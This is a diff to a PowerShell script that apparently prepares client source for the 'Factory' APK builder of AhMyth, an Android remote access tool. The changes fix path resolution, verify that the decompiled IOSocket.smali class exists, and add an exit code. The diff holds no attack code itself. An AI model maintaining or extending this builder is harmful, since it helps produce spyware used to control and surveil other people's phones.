@@ -8,7 +8,22 @@ param(
 
 $ErrorActionPreference = "Stop"
 $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
-$clientDir = Join-Path $scriptDir ".." ".." ".." "AhMyth-Client"
+# Calculate client directory path (Factory is at AhMyth-Server/app/Factory, client is at AhMyth-Client)
+# Go up 3 levels: Factory -> app -> AhMyth-Server -> root, then into AhMyth-Client
+$parentDir = Split-Path -Parent $scriptDir  # app
+$grandparentDir = Split-Path -Parent $parentDir  # AhMyth-Server
+$rootDir = Split-Path -Parent $grandparentDir  # root
+$clientDir = Join-Path $rootDir "AhMyth-Client"
+# Resolve to absolute path to handle any relative path issues
+try {
+    $clientDir = [System.IO.Path]::GetFullPath($clientDir)
+} catch {
+    # If that fails, try Resolve-Path
+    $resolved = Resolve-Path $clientDir -ErrorAction SilentlyContinue
+    if ($resolved) {
+        $clientDir = $resolved.Path
+    }
+}
 $factoryDir = $scriptDir
 $ahmythDir = Join-Path $factoryDir "Ahmyth"
 
@@ -94,6 +109,36 @@ $manifestFile = Join-Path $ahmythDir "AndroidManifest.xml"
 
 if ((Test-Path $smaliDir) -and (Test-Path $manifestFile)) {
     Write-Host "Factory source updated successfully!" -ForegroundColor Green
+    
+    # Verify IOSocket.smali exists
+    $ioSocketPaths = @(
+        (Join-Path $ahmythDir "smali_classes3\ahmyth\mine\king\ahmyth\IOSocket.smali"),
+        (Join-Path $ahmythDir "smali\ahmyth\mine\king\ahmyth\IOSocket.smali"),
+        (Join-Path $ahmythDir "smali_classes2\ahmyth\mine\king\ahmyth\IOSocket.smali")
+    )
+    
+    $ioSocketFound = $false
+    foreach ($ioPath in $ioSocketPaths) {
+        if (Test-Path $ioPath) {
+            Write-Host "✓ IOSocket.smali found at: $ioPath" -ForegroundColor Green
+            $ioSocketFound = $true
+            break
+        }
+    }
+    
+    # If not found in standard paths, search recursively
+    if (-not $ioSocketFound) {
+        Write-Host "⚠ IOSocket.smali not found in standard paths. Searching..." -ForegroundColor Yellow
+        $ioSocketFile = Get-ChildItem -Path $ahmythDir -Recurse -Filter "IOSocket.smali" -ErrorAction SilentlyContinue | Select-Object -First 1
+        if ($ioSocketFile) {
+            Write-Host "✓ IOSocket.smali found at: $($ioSocketFile.FullName)" -ForegroundColor Green
+            $ioSocketFound = $true
+        } else {
+            Write-Host "✗ IOSocket.smali not found after decompilation!" -ForegroundColor Red
+            Write-Host "  This may indicate an issue with the APK build or decompilation." -ForegroundColor Yellow
+        }
+    }
+    
     Write-Host "`nFactory structure:" -ForegroundColor Cyan
     Get-ChildItem $factoryDir | Where-Object { $_.PSIsContainer -or $_.Extension -eq ".jar" } | ForEach-Object {
         if ($_.PSIsContainer) {
@@ -108,4 +153,7 @@ if ((Test-Path $smaliDir) -and (Test-Path $manifestFile)) {
 }
 
 Write-Host "`nDone! The Electron GUI builder will now use the latest client source." -ForegroundColor Green
+
+# Explicitly exit with success code
+exit 0
 
